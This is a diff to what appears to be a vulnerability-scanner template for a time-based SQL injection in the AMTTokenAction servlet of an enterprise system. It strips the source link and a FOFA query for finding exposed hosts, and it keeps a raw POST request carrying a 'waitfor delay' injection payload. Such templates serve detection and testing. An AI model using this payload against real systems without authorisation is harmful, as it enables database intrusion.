@@ -3,12 +3,8 @@ info:
   name: ATM企源系统 AMTTokenAction 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rvgp4keha3ctrnik'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rvgp4keha3ctrnik
-    fofa: body="/vmain/login.jsp" || body="com.velcro"
 http:
 - raw:
   - 'POST /ServiceAction/com.velcro.internal.servlet.AMTTokenAction?action=phone&longonname=1dtvYdVz'';%20waitfor%20delay%20''0:0:5''%20--%20 HTTP/1.1
